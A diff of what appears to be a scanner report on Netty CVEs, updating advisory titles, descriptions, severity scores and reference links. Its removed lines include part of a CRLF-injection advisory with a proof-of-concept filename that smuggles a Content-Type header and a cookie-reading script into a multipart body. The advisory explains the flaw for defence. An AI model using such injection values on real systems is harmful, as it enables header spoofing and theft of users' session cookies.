@@ -529,26 +529,35 @@
                         │      │                          cosystem%3Amaven 
                         │      ├ Fingerprint     : sha256:f1bb16a49adf09885b1616e54556f93bf3314f5818afb070cb8c4
                         │      │                   21f244b1589 
-                        │      ├ Title           : Netty: [Bzip2Decoder] Infinite Loop in RLE State Machine
-                        │      │                   Leads to Event-Loop Thread Hang 
-                        │      ├ Description     : The `Bzip2Decoder` handler in Netty's compression codec
-                        │      │                   pipeline is vulnerable to a denial-of-service attack through
-                        │      │                    a malformed bzip2 stream that permanently captures the
-                        │      │                   event-loop thread in an infinite loop. The vulnerability
-                        │      │                   exists in the run-length encoding (RLE) state machine within
-                        │      │                    [`Bzip2BlockDecompressor.read()`] 
+                        │      ├ Title           : io.netty/netty-codec-compression: Netty: Infinite loop in
+                        │      │                   netty-codec-compression (bzip2) 
+                        │      ├ Description     : A flaw was found in the netty-codec-compression component of
+                        │      │                    Netty. This vulnerability, caused by a logic error in the
+                        │      │                   bzip2 decoder, allows a remote attacker to send specially
+                        │      │                   crafted bzip2-compressed data. Processing this malformed
+                        │      │                   data can trigger an infinite loop, causing the decoder
+                        │      │                   thread to consume excessive CPU resources. This leads to a
+                        │      │                   denial of service (DoS), requiring manual intervention to
+                        │      │                   restore service. 
                         │      ├ Severity        : HIGH 
-                        │      ├ VendorSeverity   ─ ghsa: 3 
-                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
-                        │      │                         │            :N/VA:H/SC:N/SI:N/SA:N 
-                        │      │                         ╰ V40Score : 8.7 
-                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
-                        │                         ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.
+                        │      ├ VendorSeverity   ╭ ghsa  : 3 
+                        │      │                  ╰ redhat: 3 
+                        │      ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/
+                        │      │                  │        │            VI:N/VA:H/SC:N/SI:N/SA:N 
+                        │      │                  │        ╰ V40Score : 8.7 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+                        │      │                           │           /A:H 
+                        │      │                           ╰ V3Score : 7.5 
+                        │      ╰ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-59901 
+                        │                         ├ [1]: https://github.com/netty/netty 
+                        │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.1.
                         │                         │      136.Final 
-                        │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.
+                        │                         ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.2.
                         │                         │      16.Final 
-                        │                         ╰ [3]: https://github.com/netty/netty/security/advisories/GHS
-                        │                                A-558v-64gr-wgg4 
+                        │                         ├ [4]: https://github.com/netty/netty/security/advisories/GHS
+                        │                         │      A-558v-64gr-wgg4 
+                        │                         ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59901 
+                        │                         ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-59901 
                         ├ [4]  ╭ VulnerabilityID : GHSA-mfg7-5gfp-c4w3 
                         │      ├ PkgName         : io.netty:netty-codec-dns 
                         │      ├ PkgPath         : openaf/Kube/netty-codec-dns-4.2.15.Final.jar 
@@ -646,8 +655,8 @@
                         │      │                          cosystem%3Amaven 
                         │      ├ Fingerprint     : sha256:1bac789759824acb6ecc6612434137fa4657e769114c434528f8b
                         │      │                   5ed1d95a321 
-                        │      ├ Title           : Netty is a network application framework for development of
-                        │      │                   protocol s ... 
+                        │      ├ Title           : io.netty/netty-codec-http: Netty: Denial of Service via SPDY
+                        │      │                    SETTINGS frame processing 
                         │      ├ Description     : Netty is a network application framework for development of
                         │      │                   protocol servers and clients. Prior to 4.1.136.Final and
                         │      │                   4.2.16.Final, Netty's SPDY SETTINGS decoder accepts a
@@ -662,21 +671,28 @@
                         │      ├ Severity        : HIGH 
                         │      ├ CweIDs           ╭ [0]: CWE-400 
                         │      │                  ╰ [1]: CWE-770 
-                        │      ├ VendorSeverity   ─ ghsa: 3 
-                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
-                        │      │                         ╰ V3Score : 7.5 
-                        │      ├ References       ╭ [0]: https://github.com/netty/netty 
-                        │      │                  ├ [1]: https://github.com/netty/netty/commit/5b68c61f37aa4a30
+                        │      ├ VendorSeverity   ╭ ghsa  : 3 
+                        │      │                  ╰ redhat: 3 
+                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+                        │      │                  │        │           /A:H 
+                        │      │                  │        ╰ V3Score : 7.5 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+                        │      │                           │           /A:H 
+                        │      │                           ╰ V3Score : 7.5 
+                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-55831 
+                        │      │                  ├ [1]: https://github.com/netty/netty 
+                        │      │                  ├ [2]: https://github.com/netty/netty/commit/5b68c61f37aa4a30
                         │      │                  │      45cba624cbea239655c9003b 
-                        │      │                  ├ [2]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4
+                        │      │                  ├ [3]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4
                         │      │                  │      b0eb9a9e17b66c52aff680c6 
-                        │      │                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.1.
+                        │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.1.
                         │      │                  │      136.Final 
-                        │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.2.
+                        │      │                  ├ [5]: https://github.com/netty/netty/releases/tag/netty-4.2.
                         │      │                  │      16.Final 
-                        │      │                  ├ [5]: https://github.com/netty/netty/security/advisories/GHS
+                        │      │                  ├ [6]: https://github.com/netty/netty/security/advisories/GHS
                         │      │                  │      A-6jqx-86gh-f27w 
-                        │      │                  ╰ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-55831 
+                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-55831 
+                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-55831 
                         │      ├ PublishedDate   : 2026-07-21T00:17:35.383Z 
                         │      ╰ LastModifiedDate: 2026-07-23T15:17:16.78Z 
                         ├ [6]  ╭ VulnerabilityID : CVE-2026-55833 
@@ -700,8 +716,8 @@
                         │      │                          cosystem%3Amaven 
                         │      ├ Fingerprint     : sha256:b5832547481f285af4f8b3cc77ece87fcb51fa79bc8aab783eae1
                         │      │                   cc426a86cec 
-                        │      ├ Title           : Netty is a network application framework for development of
-                        │      │                   protocol s ... 
+                        │      ├ Title           : netty: io.netty/netty-codec-http: Netty: Denial of Service
+                        │      │                   via SPDY header decompression amplification 
                         │      ├ Description     : Netty is a network application framework for development of
                         │      │                   protocol servers and clients. Prior to 4.1.136.Final and
                         │      │                   4.2.16.Final, Netty SPDY header decoding continues inflating
@@ -714,21 +730,28 @@
                         │      │                   4.1.136.Final and 4.2.16.Final. 
                         │      ├ Severity        : HIGH 
                         │      ├ CweIDs           ─ [0]: CWE-400 
-                        │      ├ VendorSeverity   ─ ghsa: 3 
-                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
-                        │      │                         ╰ V3Score : 7.5 
-                        │      ├ References       ╭ [0]: https://github.com/netty/netty 
-                        │      │                  ├ [1]: https://github.com/netty/netty/commit/5b68c61f37aa4a30
+                        │      ├ VendorSeverity   ╭ ghsa  : 3 
+                        │      │                  ╰ redhat: 3 
+                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+                        │      │                  │        │           /A:H 
+                        │      │                  │        ╰ V3Score : 7.5 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+                        │      │                           │           /A:H 
+                        │      │                           ╰ V3Score : 7.5 
+                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-55833 
+                        │      │                  ├ [1]: https://github.com/netty/netty 
+                        │      │                  ├ [2]: https://github.com/netty/netty/commit/5b68c61f37aa4a30
                         │      │                  │      45cba624cbea239655c9003b 
-                        │      │                  ├ [2]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4
+                        │      │                  ├ [3]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4
                         │      │                  │      b0eb9a9e17b66c52aff680c6 
-                        │      │                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.1.
+                        │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.1.
                         │      │                  │      136.Final 
-                        │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.2.
+                        │      │                  ├ [5]: https://github.com/netty/netty/releases/tag/netty-4.2.
                         │      │                  │      16.Final 
-                        │      │                  ├ [5]: https://github.com/netty/netty/security/advisories/GHS
+                        │      │                  ├ [6]: https://github.com/netty/netty/security/advisories/GHS
                         │      │                  │      A-mvh2-crg5-v77c 
-                        │      │                  ╰ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-55833 
+                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-55833 
+                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-55833 
                         │      ├ PublishedDate   : 2026-07-21T00:17:35.537Z 
                         │      ╰ LastModifiedDate: 2026-07-23T13:34:45.383Z 
                         ├ [7]  ╭ VulnerabilityID : CVE-2026-56745 
@@ -752,8 +775,8 @@
                         │      │                          cosystem%3Amaven 
                         │      ├ Fingerprint     : sha256:7cea1da414d1d40da0b2af5f04405ec1d76f9fe91d8ce84ff9b9a
                         │      │                   ae98c469f04 
-                        │      ├ Title           : Netty is a network application framework for development of
-                        │      │                   protocol s ... 
+                        │      ├ Title           : netty: io.netty/netty-codec-http: Netty: Denial of Service
+                        │      │                   via memory exhaustion in SPDY-to-HTTP codec 
                         │      ├ Description     : Netty is a network application framework for development of
                         │      │                   protocol servers and clients. In versions 4.2.0.Final
                         │      │                   through 4.2.15.Final and 4.1.0.Final through 4.1.135.Final,
@@ -769,22 +792,28 @@
                         │      │                   and 4.2.16.Final. 
                         │      ├ Severity        : HIGH 
                         │      ├ CweIDs           ─ [0]: CWE-400 
-                        │      ├ VendorSeverity   ─ ghsa: 3 
-                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
-                        │      │                         │            :N/VA:H/SC:N/SI:N/SA:N 
-                        │      │                         ╰ V40Score : 8.7 
-                        │      ├ References       ╭ [0]: https://github.com/netty/netty 
-                        │      │                  ├ [1]: https://github.com/netty/netty/commit/5b68c61f37aa4a30
+                        │      ├ VendorSeverity   ╭ ghsa  : 3 
+                        │      │                  ╰ redhat: 3 
+                        │      ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/
+                        │      │                  │        │            VI:N/VA:H/SC:N/SI:N/SA:N 
+                        │      │                  │        ╰ V40Score : 8.7 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+                        │      │                           │           /A:H 
+                        │      │                           ╰ V3Score : 7.5 
+                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-56745 
+                        │      │                  ├ [1]: https://github.com/netty/netty 
+                        │      │                  ├ [2]: https://github.com/netty/netty/commit/5b68c61f37aa4a30
                         │      │                  │      45cba624cbea239655c9003b 
-                        │      │                  ├ [2]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4
+                        │      │                  ├ [3]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4
                         │      │                  │      b0eb9a9e17b66c52aff680c6 
-                        │      │                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.1.
+                        │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.1.
                         │      │                  │      136.Final 
-                        │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.2.
+                        │      │                  ├ [5]: https://github.com/netty/netty/releases/tag/netty-4.2.
                         │      │                  │      16.Final 
-                        │      │                  ├ [5]: https://github.com/netty/netty/security/advisories/GHS
+                        │      │                  ├ [6]: https://github.com/netty/netty/security/advisories/GHS
                         │      │                  │      A-jppx-w49h-x2qq 
-                        │      │                  ╰ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-56745 
+                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-56745 
+                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-56745 
                         │      ├ PublishedDate   : 2026-07-21T22:17:14.5Z 
                         │      ╰ LastModifiedDate: 2026-07-22T20:35:40.827Z 
                         ├ [8]  ╭ VulnerabilityID : CVE-2026-56746 
@@ -808,8 +837,8 @@
                         │      │                          cosystem%3Amaven 
                         │      ├ Fingerprint     : sha256:c68e7991fced82238b5547241ba7ae2e20d8ac62048fc4f3e58ec
                         │      │                   abf9fa0ec85 
-                        │      ├ Title           : Netty is a network application framework for development of
-                        │      │                   protocol s ... 
+                        │      ├ Title           : io.netty/netty-codec-http: Netty: Security control bypass
+                        │      │                   allows unauthorized requests via null origin header 
                         │      ├ Description     : Netty is a network application framework for development of
                         │      │                   protocol servers and clients. Versions 4.2.0.Final through
                         │      │                   4.2.15.Final and 4.1.0.Final through 4.1.135.Final, are
@@ -827,17 +856,24 @@
                         │      │                   4.1.136.Final and 4.2.16.Final. 
                         │      ├ Severity        : MEDIUM 
                         │      ├ CweIDs           ─ [0]: CWE-284 
-                        │      ├ VendorSeverity   ─ ghsa: 2 
-                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N 
-                        │      │                         ╰ V3Score : 6.5 
-                        │      ├ References       ╭ [0]: https://github.com/netty/netty 
-                        │      │                  ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.
+                        │      ├ VendorSeverity   ╭ ghsa  : 2 
+                        │      │                  ╰ redhat: 3 
+                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H
+                        │      │                  │        │           /A:N 
+                        │      │                  │        ╰ V3Score : 6.5 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H
+                        │      │                           │           /A:N 
+                        │      │                           ╰ V3Score : 7.5 
+                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-56746 
+                        │      │                  ├ [1]: https://github.com/netty/netty 
+                        │      │                  ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.1.
                         │      │                  │      136.Final 
-                        │      │                  ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.
+                        │      │                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.2.
                         │      │                  │      16.Final 
-                        │      │                  ├ [3]: https://github.com/netty/netty/security/advisories/GHS
+                        │      │                  ├ [4]: https://github.com/netty/netty/security/advisories/GHS
                         │      │                  │      A-6cqp-g7gg-8hr5 
-                        │      │                  ╰ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-56746 
+                        │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-56746 
+                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-56746 
                         │      ├ PublishedDate   : 2026-07-21T22:17:14.667Z 
                         │      ╰ LastModifiedDate: 2026-07-22T20:35:40.827Z 
                         ├ [9]  ╭ VulnerabilityID : CVE-2026-59898 
@@ -861,27 +897,35 @@
                         │      │                          cosystem%3Amaven 
                         │      ├ Fingerprint     : sha256:88fe5c7349f60bfa5d221f257e7cb1f249874426c2c1147f16c02
                         │      │                   78b032ccd93 
-                        │      ├ Title           : Netty: WebSockets V07/V08 handshaker missing
-                        │      │                   Connection/Upgrade validation 
-                        │      ├ Description     : ## Summary
-                        │      │                   An attacker can force WebSocket upgrade via the lax V07 (or
-                        │      │                   V08) handshaker by sending `Sec-WebSocket-Version: 7` and
-                        │      │                   omitting `Connection: Upgrade` / `Upgrade: websocket`
-                        │      │                   headers, completing a protocol switch that a proxy would not
-                        │      │                    recognize as an Upgrade request and enabling HTTP request
-                        │      │                   smuggling / protocol-confusion attacks. 
+                        │      ├ Title           : io.netty/netty-codec-http: Netty: Protocol version confusion
+                        │      │                    in netty-codec-http (WebSocket) 
+                        │      ├ Description     : A flaw was found in netty-codec-http. The WebSocket
+                        │      │                   handshaker in this component fails to properly validate
+                        │      │                   protocol version information during the WebSocket upgrade
+                        │      │                   process. A remote attacker can exploit this vulnerability by
+                        │      │                    manipulating the WebSocket handshake, leading to a bypass
+                        │      │                   of security checks or the negotiation of unexpected protocol
+                        │      │                    versions. This could potentially enable protocol-level
+                        │      │                   attacks. 
                         │      ├ Severity        : MEDIUM 
-                        │      ├ VendorSeverity   ─ ghsa: 2 
-                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI
-                        │      │                         │            :N/VA:N/SC:L/SI:L/SA:N 
-                        │      │                         ╰ V40Score : 6.3 
-                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
-                        │                         ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.
+                        │      ├ VendorSeverity   ╭ ghsa  : 2 
+                        │      │                  ╰ redhat: 2 
+                        │      ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/
+                        │      │                  │        │            VI:N/VA:N/SC:L/SI:L/SA:N 
+                        │      │                  │        ╰ V40Score : 6.3 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
+                        │      │                           │           /A:N 
+                        │      │                           ╰ V3Score : 5.3 
+                        │      ╰ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-59898 
+                        │                         ├ [1]: https://github.com/netty/netty 
+                        │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.1.
                         │                         │      136.Final 
-                        │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.
+                        │                         ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.2.
                         │                         │      16.Final 
-                        │                         ╰ [3]: https://github.com/netty/netty/security/advisories/GHS
-                        │                                A-4mp9-239f-g9hg 
+                        │                         ├ [4]: https://github.com/netty/netty/security/advisories/GHS
+                        │                         │      A-4mp9-239f-g9hg 
+                        │                         ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59898 
+                        │                         ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-59898 
                         ├ [10] ╭ VulnerabilityID : CVE-2026-59899 
                         │      ├ VendorIDs        ─ [0]: GHSA-q4f6-jm68-57ww 
                         │      ├ PkgName         : io.netty:netty-codec-http 
@@ -903,31 +947,35 @@
                         │      │                          cosystem%3Amaven 
                         │      ├ Fingerprint     : sha256:9aaa5f423de059c1a3db976b4d6bb8094f2292925196bc6a8446f
                         │      │                   ae769d7b330 
-                        │      ├ Title           : Netty: [HttpContentEncoder] Unbounded Per-Connection Queue
-                        │      │                   Growth via HTTP/1.1 Pipelining Leads to Denial of Service 
-                        │      ├ Description     : ### Impact
-                        │      │                   `HttpContentEncoder` (the superclass of the production
-                        │      │                   handler `HttpContentCompressor`) maintains a per-channel
-                        │      │                   `ArrayDeque<CharSequence>` named `acceptEncodingQueue` that
-                        │      │                   accumulates attacker-controlled data without any size limit.
-                        │      │                    The queue is filled on the I/O thread for every inbound
-                        │      │                   HTTP request and drained only when the application later
-                        │      │                   writes a non-1xx response. This creates a resource
-                        │      │                   exhaustion vulnerability when an attacker exploits HTTP/1.1
-                        │      │                   pipelining to flood the connection with requests faster than
-                        │      │                    the application produces responses. 
+                        │      ├ Title           : io.netty/netty-codec-http: Netty: Memory exhaustion in
+                        │      │                   netty-codec-http (decompression bomb) 
+                        │      ├ Description     : A flaw was found in the Netty netty-codec-http component. A
+                        │      │                   remote attacker can send HTTP requests containing highly
+                        │      │                   compressed data. The HTTP decoder in netty-codec-http fails
+                        │      │                   to properly limit the decompression of this content, causing
+                        │      │                    the system to consume excessive memory. This can lead to
+                        │      │                   memory exhaustion and a denial of service (DoS), making the
+                        │      │                   service unavailable to legitimate users. 
                         │      ├ Severity        : MEDIUM 
-                        │      ├ VendorSeverity   ─ ghsa: 2 
-                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
-                        │      │                         │            :N/VA:L/SC:N/SI:N/SA:N 
-                        │      │                         ╰ V40Score : 6.9 
-                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
-                        │                         ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.
+                        │      ├ VendorSeverity   ╭ ghsa  : 2 
+                        │      │                  ╰ redhat: 3 
+                        │      ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/
+                        │      │                  │        │            VI:N/VA:L/SC:N/SI:N/SA:N 
+                        │      │                  │        ╰ V40Score : 6.9 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+                        │      │                           │           /A:H 
+                        │      │                           ╰ V3Score : 7.5 
+                        │      ╰ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-59899 
+                        │                         ├ [1]: https://github.com/netty/netty 
+                        │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.1.
                         │                         │      136.Final 
-                        │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.
+                        │                         ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.2.
                         │                         │      16.Final 
-                        │                         ╰ [3]: https://github.com/netty/netty/security/advisories/GHS
-                        │                                A-q4f6-jm68-57ww 
+                        │                         ├ [4]: https://github.com/netty/netty/security/advisories/GHS
+                        │                         │      A-q4f6-jm68-57ww 
+                        │                         ├ [5]: https://netty.io/news/2026/07/09/4-1-136-Final.html 
+                        │                         ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-59899 
+                        │                         ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-59899 
                         ├ [11] ╭ VulnerabilityID : CVE-2026-59921 
                         │      ├ VendorIDs        ─ [0]: GHSA-gcjf-9mgh-3p7g 
                         │      ├ PkgName         : io.netty:netty-codec-http 
@@ -949,385 +997,44 @@
                         │      │                          cosystem%3Amaven 
                         │      ├ Fingerprint     : sha256:0972b048d42d83e77c19d9bdcb2503953f550d63f01c876b5c9cd
                         │      │                   99f29ad18c4 
-                        │      ├ Title           : Netty: CRLF Injection via Multipart Filename in Netty
-                        │      │                   HttpPostRequestEncoder 
-                        │      ├ Description     : # Security Vulnerability Report: CRLF Injection via
-                        │      │                   Multipart Filename in Netty HttpPostRequestEncoder
-                        │      │                   
-                        │      │                   ## 1. Vulnerability Summary
-                        │      │                   | Field | Value |
-                        │      │                   |-------|-------|
-                        │      │                   | **Product** | Netty |
-                        │      │                   | **Version** | 4.2.12.Final (and all prior versions with
-                        │      │                   codec-http multipart) |
-                        │      │                   | **Component** |
-                        │      │                   `io.netty.handler.codec.http.multipart.HttpPostRequestEncode
-                        │      │                   r` |
-                        │      │                   | **Vulnerability Type** | CWE-93: Improper Neutralization
-                        │      │                   of CRLF Sequences / CWE-113: HTTP Response Splitting |
-                        │      │                   | **Impact** | MIME Header Injection / Content-Type Spoofing
-                        │      │                    / XSS via Content-Disposition |
-                        │      │                   | **CVSS 3.1 Score** | **8.1 (High)** |
-                        │      │                   | **CVSS 3.1 Vector** |
-                        │      │                   `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
-                        │      │                   | **Attack Vector** | Network |
-                        │      │                   | **Attack Complexity** | Low |
-                        │      │                   | **Privileges Required** | Low (attacker must be able to
-                        │      │                   upload files with controlled filenames) |
-                        │      │                   | **User Interaction** | None |
-                        │      │                   | **Scope** | Unchanged |
-                        │      │                   | **Confidentiality Impact** | High |
-                        │      │                   | **Integrity Impact** | High |
-                        │      │                   | **Availability Impact** | None |
-                        │      │                   ## 2. Affected Components
-                        │      │                   The following classes in the `codec-http` module are
-                        │      │                   affected:
-                        │      │                   -
-                        │      │                   r` — directly concatenates unvalidated filename/name into
-                        │      │                   `Content-Disposition` MIME headers (lines 519, 633, 674,
-                        │      │                   682, 686-688)
-                        │      │                   - `io.netty.handler.codec.http.multipart.DiskFileUpload` —
-                        │      │                   `setFilename()` only checks null (line 78)
-                        │      │                   - `io.netty.handler.codec.http.multipart.MemoryFileUpload` —
-                        │      │                    `setFilename()` only checks null (line 60)
-                        │      │                   - `io.netty.handler.codec.http.multipart.MixedFileUpload` —
-                        │      │                   `setFilename()` delegates without validation (line 62)
-                        │      │                   ## 3. Vulnerability Description
-                        │      │                   Netty's `HttpPostRequestEncoder` constructs multipart HTTP
-                        │      │                   request bodies by directly concatenating user-supplied
-                        │      │                   filenames and field names into `Content-Disposition` MIME
-                        │      │                   headers **without validating or sanitizing CRLF characters**
-                        │      │                    (`\r\n`). Since MIME headers are delimited by CRLF, an
-                        │      │                   attacker who controls the filename can inject arbitrary MIME
-                        │      │                    headers into the multipart body part.
-                        │      │                   ### Root Cause
-                        │      │                   In `HttpPostRequestEncoder.java`, multiple code paths
-                        │      │                   directly embed `fileUpload.getFilename()` into header
-                        │      │                   strings:
-                        │      │                   ```java
-                        │      │                   // Line 674 (attachment mode):
-                        │      │                   internal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + ":
-                        │      │                   "
-                        │      │                       + HttpHeaderValues.ATTACHMENT + "; "
-                        │      │                       + HttpHeaderValues.FILENAME + "=\"" +
-                        │      │                   fileUpload.getFilename() + "\"\r\n");
-                        │      │                   //                                       
-                        │      │                   ^^^^^^^^^^^^^^^^^^^^^^^^ NO VALIDATION
-                        │      │                   // Lines 686-688 (form-data mode):
-                        │      │                   internal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + ": "
-                        │      │                    + HttpHeaderValues.FORM_DATA + "; "
-                        │      │                       + HttpHeaderValues.NAME + "=\"" + fileUpload.getName() +
-                        │      │                    "\"; "
-                        │      │                   // Line 519 (attribute name):
-                        │      │                       + HttpHeaderValues.NAME + "=\"" + attribute.getName() +
-                        │      │                   "\"\r\n");
-                        │      │                   //                                    ^^^^^^^^^^^^^^^^^ NO
-                        │      │                   VALIDATION
-                        │      │                   ```
-                        │      │                   The `setFilename()` method in all `FileUpload`
-                        │      │                   implementations only checks for null:
-                        │      │                   // DiskFileUpload.java:77-79
-                        │      │                   public void setFilename(String filename) {
-                        │      │                       this.filename = ObjectUtil.checkNotNull(filename,
-                        │      │                   "filename");
-                        │      │                       // NO CRLF VALIDATION
-                        │      │                   }
-                        │      │                   ### Comparison with Similar Fixed CVEs
-                        │      │                   This vulnerability follows the same pattern as:
-                        │      │                   | CVE | Component | Fix |
-                        │      │                   |-----|-----------|-----|
-                        │      │                   | **GHSA-jq43-27x9-3v86** | SmtpRequestEncoder — SMTP
-                        │      │                   command injection | Added CRLF validation in
-                        │      │                   `SmtpUtils.validateSMTPParameters()` |
-                        │      │                   | **GHSA-84h7-rjj3-6jx4** | HttpRequestEncoder — CRLF in URI
-                        │      │                    | Added `HttpUtil.validateRequestLineTokens()` |
-                        │      │                   The multipart encoder has **no equivalent validation** for
-                        │      │                   filenames or field names.
-                        │      │                   ## 4. Exploitability Prerequisites
-                        │      │                   This vulnerability is exploitable when:
-                        │      │                   1. The application uses Netty's `HttpPostRequestEncoder` to
-                        │      │                   construct multipart HTTP requests
-                        │      │                   2. The filename of an uploaded file is derived from
-                        │      │                   user-controlled input
-                        │      │                   3. The application does **not** perform its own CRLF
-                        │      │                   sanitization on filenames
-                        │      │                   **Common affected patterns**:
-                        │      │                   - File upload proxies that forward user-supplied filenames
-                        │      │                   - API gateways that construct multipart requests from
-                        │      │                   incoming parameters
-                        │      │                   - Microservice communication that passes filenames between
-                        │      │                   services
-                        │      │                   - Testing/automation frameworks that use Netty HTTP client
-                        │      │                   with user-defined filenames
-                        │      │                   ## 5. Attack Scenarios
-                        │      │                   ### Scenario 1: Content-Type Override via Filename
-                        │      │                   Injection
-                        │      │                   An attacker uploads a file with a crafted filename to
-                        │      │                   override the Content-Type of the multipart body part,
-                        │      │                   potentially enabling stored XSS:
-                        │      │                   String maliciousFilename = "photo.jpg\"\r\nContent-Type:
-                        │      │                   text/html\r\n\r\n<script>alert(document.cookie)</script>\r\n
-                        │      │                   --";
-                        │      │                   DiskFileUpload upload = new DiskFileUpload(
-                        │      │                       "avatar", maliciousFilename, "image/jpeg", "binary",
-                        │      │                   UTF_8, fileSize);
-                        │      │                   **Wire format:**
-                        │      │                   --boundary
-                        │      │                   content-disposition: form-data; name="avatar";
-                        │      │                   filename="photo.jpg"
-                        │      │                   Content-Type: text/html                    <-- INJECTED:
-                        │      │                   overrides image/jpeg
-                        │      │                   <script>alert(document.cookie)</script>    <-- INJECTED: XSS
-                        │      │                    payload
-                        │      │                   --"
